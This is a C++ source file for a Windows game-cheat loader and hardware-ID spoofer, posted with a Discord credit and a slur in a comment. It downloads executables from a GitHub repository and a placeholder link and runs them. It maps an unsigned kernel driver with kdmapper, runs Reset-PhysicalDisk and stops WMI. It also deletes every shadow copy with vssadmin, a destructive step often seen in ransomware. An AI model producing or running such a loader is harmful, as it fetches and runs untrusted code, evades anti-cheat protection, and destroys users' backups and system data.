#include <iostream>


#include <Windows.h>
#include <ios>
#include <limits>
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <sstream>
#include <string>
#include <urlmon.h>
#include <tchar.h>
#include <iostream>
//#include "CConsole.h"
#include "CConsole.cpp"
#include <stdio.h>
#include <string>
#include <Windows.h>
#include <tchar.h>
#include <Wininet.h>
#include <filesystem>
#include <iostream>
#include <stdexcept>
#include <string>
#include <iostream>
#include <windows.h> 
#include <iostream>
#include <fstream>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")


//made by ritz#9009
//  https://discord.gg/MqM4M9Tq4B
// delete ^^^ and ur gay

using namespace std;

void spoofdownload()
{

    HRESULT a = URLDownloadToFile(NULL, _T("https://raw.githubusercontent.com/HappyCatOfficial/LydianSpooferCracked/main/kdmappernew.exe"), _T("C:/Windows/IME/kdmapper.exe"), 0, NULL);
    HRESULT ab = URLDownloadToFile(NULL, _T("spooferdriver.sys download link"), _T("spooferdriver.sys"), 0, NULL);
    CConsole::Clear();

}



void downloadcheat()
{
    HRESULT a = URLDownloadToFile(NULL, _T("cheat.exe download"), _T("cheat.exe"), 0, NULL);
    CConsole::Clear();


}
int main()
{

    SetConsoleTitle(_T("YourFirstPastedNotepadLoader"));



    std::fstream myfile;
    std::string line;
    ofstream outFile;





    outFile.open("YourFirstPastedNotepadLoader.txt");
    outFile << "Your First Pasted Notepad Loader!\n" << endl;
    outFile.close();

    system("start YourFirstPastedNotepadLoader.txt");
    Sleep(3000);
    outFile.open("YourFirstPastedNotepadLoader.txt");
    outFile << "Spoofing..." << endl;
    outFile.close();
    system("TASKKILL /F /IM notepad.exe 1>NULL");

    system("start YourFirstPastedNotepadLoader.txt");


    system("powershell.exe  Reset-PhysicalDisk * >nul 2>&1");
    CConsole::Clear();
    system("start C:/Windows/IME/kdmapper.exe spooferdriver.sys");
    CConsole::Clear();
    system("NETSH WINSOCK RESET");
    CConsole::Clear();
    system("NETSH INT IP RESET");
    CConsole::Clear();
    system("NETSH INTERFACE IPV4 RESET");
    CConsole::Clear();
    system("NETSH INTERFACE IPV6 RESET");
    CConsole::Clear();
    system("NETSH INTERFACE TCP RESET");
    CConsole::Clear();
    system("IPCONFIG /RELEASE");
    CConsole::Clear();
    system("IPCONFIG /RELEASE");
    CConsole::Clear();
    system("IPCONFIG /RENEW");
    CConsole::Clear();
    system("IPCONFIG /FLUSHDNS");
    CConsole::Clear();
    system("IPCONFIG /RENEW");
    CConsole::Clear();
    system("net stop winmgmt /y >nul 2>&1");
    CConsole::Clear();
    system("vssadmin delete shadows /All /Quiet >nul 2>&1");
    CConsole::Clear();


    outFile.open("YourFirstPastedNotepadLoader.txt");
    outFile << "Loading Cheat..." << endl;
    outFile.close();
    system("TASKKILL /F /IM notepad.exe 1>NULL");

    system("start YourFirstPastedNotepadLoader.txt");
    downloadcheat();

    outFile.open("YourFirstPastedNotepadLoader.txt");
    outFile << "Success!" << endl;
    outFile.close();
    system("TASKKILL /F /IM notepad.exe 1>NULL");

    system("start YourFirstPastedNotepadLoader.txt");

    system("start cheat.exe");
    Sleep(-1);






}

